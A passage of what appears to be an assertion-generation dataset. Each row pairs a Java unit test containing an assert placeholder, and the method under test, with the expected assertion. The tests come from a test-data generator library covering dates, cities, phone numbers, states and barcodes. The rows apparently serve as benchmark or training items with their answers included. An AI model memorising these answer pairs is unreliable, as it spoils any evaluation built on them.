generate() { assertInitialized(); ProductWrapper<Long> tmp = generateFromSource(); if (tmp == null) { return null; } Long millis = tmp.unwrap(); return new Date(millis); }"	assertTrue(dateGenerator.generate().compareTo(maxDate) <= 0)
"testIsThreadSafe() { ""<AssertPlaceHolder>""; }
isThreadSafe() { return super.isThreadSafe() && dateConverter.isThreadSafe(); }"	assertTrue((new DateGenerator()).isThreadSafe())
"testIsThreadSafe2() { Date min = new Date(1L); Date max = new Date(1L); ""<AssertPlaceHolder>""; }
isThreadSafe() { return super.isThreadSafe() && dateConverter.isThreadSafe(); }"	assertFalse( (new DateGenerator(min, max, 1L, new IndexBasedSampleGeneratorProxyTest.TestDistribution())).isThreadSafe())
"testIsParallelizable() { ""<AssertPlaceHolder>""; }
isParallelizable() { return super.isParallelizable() && dateConverter.isParallelizable(); }"	assertTrue((new DateGenerator()).isParallelizable())
"testIsParallelizable2() { Date min = new Date(1L); Date max = new Date(1L); ""<AssertPlaceHolder>""; }
isParallelizable() { return super.isParallelizable() && dateConverter.isParallelizable(); }"	assertFalse((new DateGenerator(min, max, 1L, new IndexBasedSampleGeneratorProxyTest.TestDistribution())) .isParallelizable())
"testConvert_absolute() { NoiseInducer inducer = new NoiseInducer(-2., 2., 0.01); inducer.setContext(new DefaultBeneratorContext()); inducer.setRelative(false); for (int i = 0; i < 100; i++) { Number result = inducer.convert(0.); ""<AssertPlaceHolder>""; } }
setRelative(boolean relative) { this.relative = relative; }"	assertTrue(result.intValue() >= -2. && result.intValue() <= 2.)
"testConvert_relative() { NoiseInducer inducer = new NoiseInducer(-0.5, 0.5, 0.01); inducer.setRelative(true); inducer.setContext(new DefaultBeneratorContext()); for (int i = 0; i < 100; i++) { ""<AssertPlaceHolder>""; } }
setRelative(boolean relative) { this.relative = relative; }"	assertEquals(0., inducer.convert(0.))
"testConvertMinMax() { NoiseInducer inducer = new NoiseInducer(-2., 2., 1); inducer.setRelative(false); inducer.setContext(new DefaultBeneratorContext()); for (int i = 0; i < 100; i++) { Number result = inducer.convert(0, -1., 1.); ""<AssertPlaceHolder>""; } }
convert(Number sourceValue, Number minValue, Number maxValue) { if (sourceValue == null) { return null; } Number result = convert(sourceValue); double rd = result.doubleValue(); if (rd < minValue.doubleValue()) { return minValue; } if (rd > maxValue.doubleValue()) { return maxValue; } return result; }"	assertTrue(result.intValue() >= -1. && result.intValue() <= 1.)
"testDistribution() { Integer[] samples = new Integer[] {0, 1, 2}; SampleGenerator<Integer> generator = new SampleGenerator<>(Integer.class); generator.setValues(samples); generator.init(context); int n = 10000; int[] sampleCount = new int[3]; for (int i = 0; i < n; i++) { sampleCount[GeneratorUtil.generateNonNull(generator)]++; } for (int i = 0; i < sampleCount.length; i++) { int count = sampleCount[i]; double measuredProbability = (float) count / n; double expectedProbability = 1. / samples.length; double ratio = measuredProbability / expectedProbability; if (logger.isDebugEnabled()) { logger.debug(i + "" "" + count + "" "" + ratio); } ""<AssertPlaceHolder>""; } }
init(GeneratorContext context) { assertNotInitialized(); if (samples.isEmpty()) { throw new InvalidGeneratorSetupException(""No samples defined in "" + this); } else { if(distribution != null){ indexGenerator = distribution.createNumberGenerator(Integer.class, 0, samples.size() - 1, 1, unique); indexGenerator.init(context); } else { indexGenerator = SequenceManager.RANDOM_SEQUENCE.createNumberGenerator(Integer.class, 0, samples.size() - 1, 1, unique); indexGenerator.init(context); } } super.init(context); }"	assertTrue(ratio > 0.9 && ratio < 1.1)
"testBigSet() { // init generator SampleGenerator<Integer> generator = new SampleGenerator<>(Integer.class); for (int i = 0; i < 200000; i++) { generator.addValue(i % 100); } generator.init(context); // test for (int i = 0; i < 100; i++) { int product = GeneratorUtil.generateNonNull(generator); ""<AssertPlaceHolder>""; } }
init(GeneratorContext context) { assertNotInitialized(); if (samples.isEmpty()) { throw new InvalidGeneratorSetupException(""No samples defined in "" + this); } else { if(distribution != null){ indexGenerator = distribution.createNumberGenerator(Integer.class, 0, samples.size() - 1, 1, unique); indexGenerator.init(context); } else { indexGenerator = SequenceManager.RANDOM_SEQUENCE.createNumberGenerator(Integer.class, 0, samples.size() - 1, 1, unique); indexGenerator.init(context); } } super.init(context); }"	"assertTrue(""generated value not in expected value range: "" + product, 0 <= product && product <= 99)"
"ParseException { // prepare SimpleDateFormat format = new SimpleDateFormat(""dd.MM.yyyy""); ParseFormatConverter<Date> converter = new ParseFormatConverter<>(Date.class, format, false); SequencedCSVSampleGenerator<Date> generator = new SequencedCSVSampleGenerator<>(DATE_FILE_PATH, converter); generator.init(context); // test List<Date> expectedDates = CollectionUtil.toList(sdf.parse(""01.02.2003""), sdf.parse(""02.02.2003""), sdf.parse(""03.02.2003"")); for (int i = 0; i < 100; i++) { Date generatedDate = GeneratorUtil.generateNonNull(generator); ""<AssertPlaceHolder>""; } }
init(GeneratorContext context) { if (uri == null) { throw new InvalidGeneratorSetupException(""uri is not set""); } try (CSVLineIterator parser = new CSVLineIterator(uri)) { List<E> samples = new ArrayList<>(); DataContainer<String[]> container = new DataContainer<>(); while ((container = parser.next(container)) != null) { String[] tokens = container.getData(); if (tokens.length > 0) { samples.add(converter.convert(tokens[0])); } } ((SampleGenerator<E>) getSource()).setValues(samples); super.init(context); } catch (ConversionException e) { throw new InvalidGeneratorSetupException(""URI content not valid"", e); } }"	"assertTrue(""generated date not in expected value set: "" + sdf.format(generatedDate), expectedDates.contains(generatedDate))"
"Exception { File csvFile = new File(BIG_FILE_NAME); try { // prepare PrintWriter writer = new PrintWriter(new BufferedWriter(new FileWriter(csvFile))); // create large CSV file for (int i = 0; i < 200000; i++) { writer.println(i % 100); } writer.close();  // test generator Converter<String, Integer> converter = ConverterManager.getInstance().createConverter( String.class, Integer.class); SequencedCSVSampleGenerator<Integer> generator = new SequencedCSVSampleGenerator<>(BIG_FILE_NAME, converter); generator.init(context); for (int i = 0; i < 1000; i++) { int product = GeneratorUtil.generateNonNull(generator); ""<AssertPlaceHolder>""; } } finally { // delete CSV file FileUtil.deleteIfExists(csvFile); } }
init(GeneratorContext context) { if (uri == null) { throw new InvalidGeneratorSetupException(""uri is not set""); } try (CSVLineIterator parser = new CSVLineIterator(uri)) { List<E> samples = new ArrayList<>(); DataContainer<String[]> container = new DataContainer<>(); while ((container = parser.next(container)) != null) { String[] tokens = container.getData(); if (tokens.length > 0) { samples.add(converter.convert(tokens[0])); } } ((SampleGenerator<E>) getSource()).setValues(samples); super.init(context); } catch (ConversionException e) { throw new InvalidGeneratorSetupException(""URI content not valid"", e); } }"	"assertTrue(""generated value not in expected value range: "" + product, 0 <= product && product <= 99)"
"ParseException { // prepare SimpleDateFormat format = new SimpleDateFormat(""dd.MM.yyyy""); ParseFormatConverter<Date> converter = new ParseFormatConverter<>(Date.class, format, false); WeightedCSVSampleGenerator<Date> generator = new WeightedCSVSampleGenerator<>( Date.class, FILE_PATH, Encodings.UTF_8, ',', converter); generator.init(context); // run test List<Date> expectedDates = CollectionUtil.toList(sdf.parse(""01.02.2003""), sdf.parse(""02.02.2003""), sdf.parse(""03.02.2003"")); for (int i = 0; i < 10; i++) { Date generatedDate = GeneratorUtil.generateNonNull(generator); ""<AssertPlaceHolder>""; } }
init(GeneratorContext context) { List<WeightedSample<E>> samples = CSVGeneratorUtil.parseFile(uri, separator, encoding, converter); AttachedWeightSampleGenerator<E> awSource = (AttachedWeightSampleGenerator<E>) getSource(); if (!samples.isEmpty()) { for (WeightedSample<E> sample : samples) { awSource.addSample(sample.getValue(), sample.getWeight()); } } else { awSource.clear(); logger.warn(""CSV file is empty: {}"", uri); } super.init(context); }"	"assertTrue(""generated date not in expected value set: "" + sdf.format(generatedDate), expectedDates.contains(generatedDate))"
"testFormatSummary() { repository.addSample(NAME, 100); String summary = repository.formatSummary(); ConsolePrinter.printStandard(summary); String expectedSummary = ""CounterRepositoryTest: 100 ms total, 1 inv, 100.0 ms/inv (avg.)"" + SystemInfo.LF; ""<AssertPlaceHolder>""; }
formatSummary() { DecimalFormat df = new DecimalFormat(""0.0"", DecimalFormatSymbols.getInstance(Locale.US)); List<String[]> list = new ArrayList<>(counters.size()); List<LatencyCounter> sortedCounters = new ArrayList<>(counters.values()); sortedCounters.sort((c1, c2) -> -Long .compare(c1.totalLatency(), c2.totalLatency())); for (LatencyCounter counter : sortedCounters) { list.add(new String[] { counter.getName() + "":"", counter.totalLatency() + "" ms total,"", counter.sampleCount() + "" inv,"", df.format(counter.averageLatency()) + "" ms/inv (avg.)"" }); } return formatSummaryTable(list); }"	assertEquals(expectedSummary, summary)
"testSetSampleCount() { LatencyCounter counter = new LatencyCounter(""test""); counter.start(); for (int i = 10; i <= 13; i++) counter.addSample(i); counter.stop(); counter.setSampleCount(1500); ""<AssertPlaceHolder>""; }
sampleCount() { return sampleCount; }"	assertEquals(1500, counter.sampleCount())
"testPrintSummary() { Assume.assumeTrue(isLinux()); LatencyCounter counter = new LatencyCounter(""test""); counter.start(); for (int i = 10; i <= 13; i++) counter.addSample(i); counter.stop(); StringWriter sw = new StringWriter(); PrintWriter out = new PrintWriter(sw); counter.printSummary(out, 50); String text = sw.toString(); ConsolePrinter.printStandard(text); ""<AssertPlaceHolder>""; }
toString() { return getClass().getSimpleName(); }"	"assertEquals(""samples: 4\nmax:     13\naverage: 11.5\nmedian:  11\n50%:     11\n"", text)"
"testPrintProducts() { BufferedTextPrinter printer = new BufferedTextPrinter(); SequenceGenerator<Integer> generator = new SequenceGenerator<>(Integer.class, 1, 2, 3, 4); printProducts(generator, 4, printer); String expected = ""1"" + SystemInfo.getLineSeparator() + ""2"" + SystemInfo.getLineSeparator() + ""3"" + SystemInfo.getLineSeparator() + ""4"" + SystemInfo.getLineSeparator(); ""<AssertPlaceHolder>""; }
printProducts(Generator<?> generator, int n, TextPrinter printer) { ProductWrapper wrapper = new ProductWrapper(); for (int i = 0; i < n; i++) { ProductWrapper<?> tmp = generator.generate(wrapper); if (tmp == null) { printer.printStd(""<>""); return; } else { printer.printStd(formatter.convert(tmp.unwrap())); } } }"	assertEquals(expected, printer.toString())
"test() { MessageGenerator generator = new MessageGenerator(""Hello {0}{1}"", new ConstantTestGenerator<>(""World""), new ConstantTestGenerator<>(""!"")); init(generator); ""<AssertPlaceHolder>""; close(generator); }
generate() { return GeneratorUtil.generateNonNull(this); }"	"assertEquals(""Hello World!"", generator.generate())"
"testSkip() { SequenceTestGenerator<Integer> source = new SequenceTestGenerator<>(1, 2, 3); SkipGeneratorProxy<Integer> generator = new SkipGeneratorProxy<>(source, 1, 2); generator.init(context); int value = GeneratorUtil.generateNonNull(generator); ""<AssertPlaceHolder>""; }
init(GeneratorContext context) { // check values if (minIncrement < 0) { throw new InvalidGeneratorSetupException(""minIncrement is less than zero""); } if (maxIncrement < 0) { throw new InvalidGeneratorSetupException(""maxIncrement is less than zero""); } if (minIncrement > maxIncrement) { throw new InvalidGeneratorSetupException(""minIncrement ("" + minIncrement + "") is larger than maxIncrement ("" + maxIncrement + "")""); } super.init(context); }"	assertTrue(value == 1 || value == 2)
"testUS() { State state = new State(""ST""); City city = new City(state, ""My City"", null, new String[] {""12345""}, ""987""); PhoneNumber privatePhone = new PhoneNumber(""+12"", ""987"", ""12345678""); PhoneNumber officePhone = new PhoneNumber(""+12"", ""987"", ""12345678""); PhoneNumber mobilePhone = new PhoneNumber(""+12"", ""987"", ""12345678""); PhoneNumber fax = new PhoneNumber(""+12"", ""987"", ""12345678""); Address address = new Address( ""My Street"", ""1A"", ""12345"", city, state, Country.US, privatePhone, officePhone, mobilePhone, fax); String expected = ""1A My Street\n"" + ""My City, ST 12345\n"" + ""United States""; ""<AssertPlaceHolder>""; }
format(Address address) { try { Context context = new DefaultContext(); context.set(""address"", address); StringWriter out = new StringWriter(); script.execute(context, out); return out.toString().trim(); } catch (Exception e) { throw ExceptionFactory.getInstance().internalError( ""Error evaluating script '"" + script + ""'"", e); } }"	assertEquals(expected, AddressFormat.getInstance(address.getCountry().getIsoCode()).format(address))
"testSetName() { CityId cityId = new CityId(""Name"", ""Name Extension""); cityId.setName(""Name""); ""<AssertPlaceHolder>""; }
getName() { return name; }"	"assertEquals(""Name"", cityId.getName())"
"testSetNameExtension() { CityId cityId = new CityId(""Name"", ""Name Extension""); cityId.setNameExtension(""Name Extension""); ""<AssertPlaceHolder>""; }
getNameExtension() { return nameExtension; }"	"assertEquals(""Name Extension"", cityId.getNameExtension())"
"testHashCode2() { CityId cityId = new CityId(null, ""Name Extension""); cityId.setName(""Name""); ""<AssertPlaceHolder>""; }
hashCode() { return name.hashCode() * 29 + (nameExtension != null ? nameExtension.hashCode() : 0); }"	assertEquals(375602761, cityId.hashCode())
"testCityHelperConstructor2() { State state = new State(); CityManager.CityHelper actualCityHelper = new CityManager.CityHelper(state, new CityId(""Name"", ""Name Extension""), new String[]{""foo"", ""foo"", ""foo""}, ""Area Code""); actualCityHelper.setPostalCode(""Postal Code""); ""<AssertPlaceHolder>""; }
getPostalCode() { return postalCode; }"	"assertEquals(""Postal Code"", actualCityHelper.getPostalCode())"
"testCityHelperSetPostalCode() { CityId cityId = new CityId(""Name"", ""Name Extension""); CityManager.CityHelper cityHelper = new CityManager.CityHelper(new State(), cityId, new String[]{""foo"", ""foo"", ""foo""}, ""Area Code""); cityHelper.setPostalCode(""Postal Code""); ""<AssertPlaceHolder>""; }
getPostalCode() { return postalCode; }"	"assertEquals(""Postal Code"", cityHelper.getPostalCode())"
"testSetNameExtension() { City city = new City(new State(), ""Name"", ""Addition"", new String[] {""foo"", ""foo"", ""foo""}, ""Area Code""); city.setNameExtension(""Name Extension""); ""<AssertPlaceHolder>""; }
getNameExtension() { return nameExtension; }"	"assertEquals(""Name Extension"", city.getNameExtension())"
"testSetPostalCodes() { City city = new City(new State(), ""Name"", ""Addition"", new String[] {""foo"", ""foo"", ""foo""}, ""Area Code""); String[] stringArray = new String[] {""foo"", ""foo"", ""foo""}; city.setPostalCodes(stringArray); ""<AssertPlaceHolder>""; }
getPostalCodes() { return postalCodes; }"	assertSame(stringArray, city.getPostalCodes())
"testAddPostalCode() { City city = new City(new State(), ""Name"", ""Addition"", new String[] {""foo"", ""foo"", ""foo""}, ""Area Code""); city.addPostalCode(""Postal Code""); ""<AssertPlaceHolder>""; }
getPostalCodes() { return postalCodes; }"	assertEquals(4, city.getPostalCodes().length)
"testgetPostalCodes() { ""<AssertPlaceHolder>""; }
getPostalCodes() { return postalCodes; }"	"assertEquals(3, (new City(new State(), ""Name"", ""Addition"", new String[] {""foo"", ""foo"", ""foo""}, ""Area Code"")) .getPostalCodes().length)"
"testSetZipCodes() { City city = new City(new State(), ""Name"", ""Addition"", new String[] {""foo"", ""foo"", ""foo""}, ""Area Code""); String[] stringArray = new String[] {""foo"", ""foo"", ""foo""}; city.setPostalCodes(stringArray); ""<AssertPlaceHolder>""; }
getPostalCodes() { return postalCodes; }"	assertSame(stringArray, city.getPostalCodes())
"testAddZipCode() { City city = new City(new State(), ""Name"", ""Addition"", new String[] {""foo"", ""foo"", ""foo""}, ""Area Code""); city.addPostalCode(""21654""); ""<AssertPlaceHolder>""; }
getPostalCodes() { return postalCodes; }"	assertEquals(4, city.getPostalCodes().length)
"testSetAreaCode() { City city = new City(new State(), ""Name"", ""Addition"", new String[] {""foo"", ""foo"", ""foo""}, ""Area Code""); city.setAreaCode(""4105551212""); ""<AssertPlaceHolder>""; }
getAreaCode() { return areaCode; }"	"assertEquals(""4105551212"", city.getAreaCode())"
"testSetState() { City city = new City(new State(), ""Name"", ""Addition"", new String[] {""foo"", ""foo"", ""foo""}, ""Area Code""); city.setState(new State()); ""<AssertPlaceHolder>""; }
getCountry() { return (state != null ? state.getCountry() : null); }"	assertNull(city.getCountry())
"testGetLanguage() { ""<AssertPlaceHolder>""; }
getLanguage() { if (language != null) { return language; } if (state != null) { return state.getDefaultLanguageLocale(); } Country country = getCountry(); return (country != null ? country.getDefaultLanguageLocale() : null); }"	"assertNull((new City(null, ""Name"", ""Addition"", new String[] {""foo"", ""foo"", ""foo""}, ""Area Code"")).getLanguage())"
"testGetLanguage2() { Locale locale = new Locale(""en""); State state = new State(); state.setDefaultLanguageLocale(locale); ""<AssertPlaceHolder>""; }
getLanguage() { if (language != null) { return language; } if (state != null) { return state.getDefaultLanguageLocale(); } Country country = getCountry(); return (country != null ? country.getDefaultLanguageLocale() : null); }"	"assertSame(locale, (new City(state, ""Name"", ""Addition"", new String[] {""foo"", ""foo"", ""foo""}, ""Area Code"")).getLanguage())"
"testGetLanguage3() { City city = new City(new State(), ""Name"", ""Addition"", new String[] {""foo"", ""foo"", ""foo""}, ""Area Code""); Locale locale = new Locale(""en""); city.setLanguage(locale); ""<AssertPlaceHolder>""; }
getLanguage() { if (language != null) { return language; } if (state != null) { return state.getDefaultLanguageLocale(); } Country country = getCountry(); return (country != null ? country.getDefaultLanguageLocale() : null); }"	assertSame(locale, city.getLanguage())
"testSetLanguage() { City city = new City(new State(), ""Name"", ""Addition"", new String[] {""foo"", ""foo"", ""foo""}, ""Area Code""); Locale locale = new Locale(""en""); city.setLanguage(locale); ""<AssertPlaceHolder>""; }
getLanguage() { if (language != null) { return language; } if (state != null) { return state.getDefaultLanguageLocale(); } Country country = getCountry(); return (country != null ? country.getDefaultLanguageLocale() : null); }"	assertSame(locale, city.getLanguage())
"testSetPopulation() { City city = new City(new State(), ""Name"", ""Addition"", new String[] {""foo"", ""foo"", ""foo""}, ""Area Code""); city.setPopulation(2); ""<AssertPlaceHolder>""; }
getPopulation() { return population; }"	assertEquals(2, city.getPopulation())
"testHashCode() { State state = new State(); state.setName(""Name""); ""<AssertPlaceHolder>""; }
hashCode() { int result; result = name.hashCode(); result = 29 * result + NullSafeComparator.hashCode(nameExtension); result = 29 * result + NullSafeComparator.hashCode(state); return result; }"	"assertEquals(-1593670502, (new City(state, ""Name"", ""Addition"", new String[] {""foo"", ""foo"", ""foo""}, ""Area Code"")).hashCode())"
"testFormat() { PhoneNumberFormat phoneNumberFormat = new PhoneNumberFormat(""Pattern""); FieldPosition pos = new FieldPosition(1); PhoneNumber obj = new PhoneNumber(); StringBuffer stringBuffer = new StringBuffer(); ""<AssertPlaceHolder>""; }
format(Object obj, StringBuffer toAppendTo, FieldPosition pos) { PhoneNumber number = (PhoneNumber) obj; for (int i = 0; i < pattern.length(); i++) { char c = pattern.charAt(i); switch (c) { case 'c': toAppendTo.append(number.getCountryCode()); break; case 'a': toAppendTo.append(number.getAreaCode()); break; case 'l': toAppendTo.append(number.getLocalNumber()); break; default: toAppendTo.append(c); } } return toAppendTo; }"	assertSame(stringBuffer, phoneNumberFormat.format(obj, stringBuffer, pos))
"testFormat2() { PhoneNumberFormat phoneNumberFormat = new PhoneNumberFormat(""""); FieldPosition pos = new FieldPosition(1); PhoneNumber obj = new PhoneNumber(); StringBuffer stringBuffer = new StringBuffer(); ""<AssertPlaceHolder>""; }
format(Object obj, StringBuffer toAppendTo, FieldPosition pos) { PhoneNumber number = (PhoneNumber) obj; for (int i = 0; i < pattern.length(); i++) { char c = pattern.charAt(i); switch (c) { case 'c': toAppendTo.append(number.getCountryCode()); break; case 'a': toAppendTo.append(number.getAreaCode()); break; case 'l': toAppendTo.append(number.getLocalNumber()); break; default: toAppendTo.append(c); } } return toAppendTo; }"	assertSame(stringBuffer, phoneNumberFormat.format(obj, stringBuffer, pos))
"testSetCountryCode() { PhoneNumber phoneNumber = new PhoneNumber(); phoneNumber.setCountryCode(""Country Code""); ""<AssertPlaceHolder>""; }
getCountryCode() { return countryCode; }"	"assertEquals(""Country Code"", phoneNumber.getCountryCode())"
"testSetAreaCode() { PhoneNumber phoneNumber = new PhoneNumber(); phoneNumber.setAreaCode(""Oxford""); ""<AssertPlaceHolder>""; }
getAreaCode() { return areaCode; }"	"assertEquals(""Oxford"", phoneNumber.getAreaCode())"
"testSetLocalNumber() { PhoneNumber phoneNumber = new PhoneNumber(); phoneNumber.setLocalNumber(""Local Number""); ""<AssertPlaceHolder>""; }
getLocalNumber() { return localNumber; }"	"assertEquals(""Local Number"", phoneNumber.getLocalNumber())"
"testSetMobile() { PhoneNumber phoneNumber = new PhoneNumber(); phoneNumber.setMobile(true); ""<AssertPlaceHolder>""; }
isMobile() { return mobile; }"	assertTrue(phoneNumber.isMobile())
"testToString() { ""<AssertPlaceHolder>""; }
toString() { return ""+"" + countryCode + '-' + areaCode + '-' + localNumber; }"	"assertEquals(""+--"", (new PhoneNumber()).toString())"
"testSetId() { State state = new State(); state.setId(""42""); ""<AssertPlaceHolder>""; }
getId() { return id; }"	"assertEquals(""42"", state.getId())"
"testSetName() { State state = new State(); state.setName(""Name""); ""<AssertPlaceHolder>""; }
getName() { return name; }"	"assertEquals(""Name"", state.getName())"
"testGetDefaultLanguage() { Locale defaultLanguage = new Locale(""en""); State state = new State(); state.setDefaultLanguageLocale(defaultLanguage); ""<AssertPlaceHolder>""; }
getDefaultLanguage() { return getDefaultLanguageLocale().getLanguage(); }"	"assertEquals(""en"", state.getDefaultLanguage())"
"testSetDefaultLanguage() { State state = new State(); state.setDefaultLanguage(""Default Language""); ""<AssertPlaceHolder>""; }
getDefaultLanguage() { return getDefaultLanguageLocale().getLanguage(); }"	"assertEquals(""default language"", state.getDefaultLanguage())"
"testGetDefaultLanguageLocale() { Locale locale = new Locale(""en""); State state = new State(); state.setDefaultLanguageLocale(locale); ""<AssertPlaceHolder>""; }
getDefaultLanguageLocale() { if (defaultLanguageLocale != null) { return defaultLanguageLocale; } else { return country.getDefaultLanguageLocale(); } }"	assertSame(locale, state.getDefaultLanguageLocale())
"testSetDefaultLanguageLocale() { Locale defaultLanguage = new Locale(""en""); State state = new State(); state.setDefaultLanguageLocale(defaultLanguage); ""<AssertPlaceHolder>""; }
getDefaultLanguage() { return getDefaultLanguageLocale().getLanguage(); }"	"assertEquals(""en"", state.getDefaultLanguage())"
"testSetPopulation() { State state = new State(); state.setPopulation(2); ""<AssertPlaceHolder>""; }
getPopulation() { return population; }"	assertEquals(2, state.getPopulation())
"testAddCity() { CityId id = new CityId(""Name"", ""Name Extension""); City city = new City(new State(), ""Name"", ""Addition"", new String[] {""foo"", ""foo"", ""foo""}, ""Area Code""); (new State()).addCity(id, city); ""<AssertPlaceHolder>""; }
getCountry() { return country; }"	assertNull(city.getCountry())
"testToString() { ""<AssertPlaceHolder>""; }
toString() { return (name != null ? name : id); }"	assertNull((new State()).toString())
"testToString2() { State state = new State(); state.setName(""Name""); ""<AssertPlaceHolder>""; }
toString() { return (name != null ? name : id); }"	"assertEquals(""Name"", state.toString())"
"testHashCode() { State state = new State(); state.setName(""Name""); ""<AssertPlaceHolder>""; }
hashCode() { return NullSafeComparator.hashCode(country) * 31 + name.hashCode(); }"	assertEquals(2420395, state.hashCode())
"testSetDataset() { StreetNameGenerator streetNameGenerator = new StreetNameGenerator(); streetNameGenerator.setDataset(""Dataset Name""); ""<AssertPlaceHolder>""; }
getDataset() { return datasetName; }"	"assertEquals(""Dataset Name"", streetNameGenerator.getDataset())"
"testGetSource() { ""<AssertPlaceHolder>""; }
getSource() { return (WeightedDatasetCSVGenerator<String>) super.getSource(); }"	assertNull((new StreetNameGenerator()).getSource())
"testGetSource2() { StreetNameGenerator streetNameGenerator = new StreetNameGenerator(); FamilyNameGenerator familyNameGenerator = new FamilyNameGenerator(); streetNameGenerator.setSource(familyNameGenerator); ""<AssertPlaceHolder>""; }
getSource() { return (WeightedDatasetCSVGenerator<String>) super.getSource(); }"	assertSame(familyNameGenerator, streetNameGenerator.getSource())
"test_DE() { StreetNameGenerator generator = new StreetNameGenerator(""DE""); generator.init(context); for (int i = 0; i < 10; i++) { String product = generator.generate(); ""<AssertPlaceHolder>""; } generator.close(); }
generate() { return GeneratorUtil.generateNonNull(this); }"	assertNotNull(product)
"test_AU() { DatasetUtil.runInRegion(Country.AUSTRALIA.getIsoCode(), () -> { StreetNameGenerator generator = new StreetNameGenerator(); generator.init(context); for (int i = 0; i < 10; i++) { String product = generator.generate(); ""<AssertPlaceHolder>""; } generator.close(); }); }
generate() { return GeneratorUtil.generateNonNull(this); }"	assertNotNull(product)
"testSetName() { Street street = new Street( new City(new State(), ""Name"", ""Addition"", new String[] {""foo"", ""foo"", ""foo""}, ""Area Code""), ""Name""); street.setName(""Name""); ""<AssertPlaceHolder>""; }
getName() { return name; }"	"assertEquals(""Name"", street.getName())"
"testSetMaxHouseNumber() { Street street = new Street( new City(new State(), ""Name"", ""Addition"", new String[] {""foo"", ""foo"", ""foo""}, ""Area Code""), ""Name""); street.setMaxHouseNumber(3); ""<AssertPlaceHolder>""; }
getMaxHouseNumber() { return maxHouseNumber; }"	assertEquals(3, street.getMaxHouseNumber())
"defaultGenerateTest() { FamilyPersonGenerator generator = new FamilyPersonGenerator(); generator.init(context); for (int i = 0; i < 10; i++) { FamilyPerson familyPerson = generator.generate(); ""<AssertPlaceHolder>""; logger.debug(""familyPerson: {}"", familyPerson); } }
generate() { return generateForDataset(randomDataset()); }"	assertNotNull(familyPerson)
"testGeneration() { TopLevelDomainGenerator generator = new TopLevelDomainGenerator(); generator.init(context); for (int i = 0; i < 10; i++) { String tld = generator.generate(); ""<AssertPlaceHolder>""; } }
generate() { return GeneratorUtil.generateNonNull(this); }"	assertNotNull(tld)
"testLocales() { Runnable runner = () -> { logger.debug(""Checking Locale "" + Locale.getDefault()); DepartmentNameGenerator generator = new DepartmentNameGenerator(); generator.init(context); for (int i = 0; i < 100; i++) { String product = generator.generate(); logger.debug(product); ""<AssertPlaceHolder>""; } }; LocaleUtil.runInLocale(Locale.US, runner); LocaleUtil.runInLocale(Locale.GERMAN, runner); LocaleUtil.runInLocale(new Locale(""XX""), runner); }
generate() { return GeneratorUtil.generateNonNull(this); }"	assertNotNull(product)
"testFemaleQuota() { PersonGenerator generator = new PersonGenerator(); generator.setDataset(""DE""); generator.setLocale(new Locale(""de_DE"")); generator.setFemaleQuota(0.1); generator.init(context); int femCount = 0; for (int i = 0; i < 1000; i++) { Person person = generator.generate(); if (person.getGender() == Gender.FEMALE) { femCount++; } logger.debug(person.toString()); } ""<AssertPlaceHolder>""; }
toString() { return getClass().getSimpleName(); }"	assertTrue(femCount < 200)
"test() { TINGenerator generator = new TINGenerator(); TINValidator validator = new TINValidator(); for (int i = 0; i < 1000; i++) { String number = generator.generate(); ""<AssertPlaceHolder>""; } }
generate() { char[] buffer = new char[10]; // create a 10-digit string of which each digit is used at most once boolean[] digitsUsed = new boolean[10]; int doubleCount = 0; for (int i = 0; i < 10; i++) { boolean done = true; do { int digit = random.nextInt(10); if (!digitsUsed[digit]) { buffer[i] = (char) ('0' + digit); digitsUsed[digit] = true; done = true; } else if (doubleCount == 0) { buffer[i] = (char) ('0' + digit); doubleCount++; done = true; } else { done = false; } } while (!done); } // assure there is a double digit if (doubleCount == 0) { int i = random.nextInt(10); int j; do { j = random.nextInt(10); } while (j == i); buffer[j] = buffer[i]; } // append checksum String s = String.valueOf(buffer); int checksum = TINValidator.calculateChecksum(s); return s + (char) (checksum + '0'); }"	assertTrue(validator.isValid(number, null))
"testSetOrdered() { EAN13Generator ean13Generator = new EAN13Generator(); ean13Generator.setOrdered(true); ""<AssertPlaceHolder>""; }
isOrdered() { return ordered; }"	assertTrue(ean13Generator.isOrdered())
"testSetOrdered() { EAN8Generator ean8Generator = new EAN8Generator(); ean8Generator.setOrdered(true); ""<AssertPlaceHolder>""; }
isOrdered() { return ordered; }"	assertTrue(ean8Generator.isOrdered())
"testSetUnique() { EANGenerator eanGenerator = new EANGenerator(); eanGenerator.setUnique(true); ""<AssertPlaceHolder>""; }
toString() { return getClass().getSimpleName() + (unique ? ""[unique]"" : """"); }"	"assertEquals(""EANGenerator[unique]"", eanGenerator.toString())"
"testEqualsIgnoringDescriptor_self() { Entity alice = createAlice(); ""<AssertPlaceHolder>""; }
equalsIgnoringDescriptor(Entity that) { if (this == that) { return true; } if (that == null) { return false; } if (this.getComponents().size() != that.getComponents().size()) { return false; } for (Map.Entry<String, Object> entry : this.getComponents().entrySet()) { Object thisValue = entry.getValue(); Object thatValue = that.getComponent(entry.getKey()); if (!equalIgnoringDescriptor(thisValue, thatValue)) return false; } return true; }"	assertTrue(alice.equalsIgnoringDescriptor(alice))
"testEqualsIgnoringDescriptor_copy() { Entity alice = createAlice(); Entity otherAlice = new Entity(alice); ""<AssertPlaceHolder>""; }
equalsIgnoringDescriptor(Entity that) { if (this == that) { return true; } if (that == null) { return false; } if (this.getComponents().size() != that.getComponents().size()) { return false; } for (Map.Entry<String, Object> entry : this.getComponents().entrySet()) { Object thisValue = entry.getValue(); Object thatValue = that.getComponent(entry.getKey()); if (!equalIgnoringDescriptor(thisValue, thatValue)) return false; } return true; }"	assertTrue(alice.equalsIgnoringDescriptor(otherAlice))
"testConstant() { SimpleTypeDescriptor d = new SimpleTypeDescriptor(""number"", p); d.setConstant(""C""); ""<AssertPlaceHolder>""; }
getConstant() { return (String) getDetailValue(CONSTANT); }"	"assertEquals(""C"", d.getConstant())"
"testSimple() { ComplexTypeDescriptor descriptor = createComplexType(""Person""); Entity entity = new Entity(descriptor, ""name"", ""Alice"", ""age"", 23); String[] featureNames = {""name"", ""age""}; Object[] array = new Object[] {""Alice"", 23}; ""<AssertPlaceHolder>""; }
convert(Object[] sourceValue) { if (sourceValue == null) { return null; } Entity entity = new Entity(descriptor); int length; if (sourceValue.length > featureNames.length) { escalator.escalate(""Row has more columns than specified in the file header"", this, sourceValue); length = featureNames.length; } else { length = sourceValue.length; } for (int i = 0; i < length; i++) { entityMutators[i].setValue(entity, sourceValue[i]); } return entity; }"	assertEquals(entity, new Array2EntityConverter(descriptor, featureNames, false).convert(array))
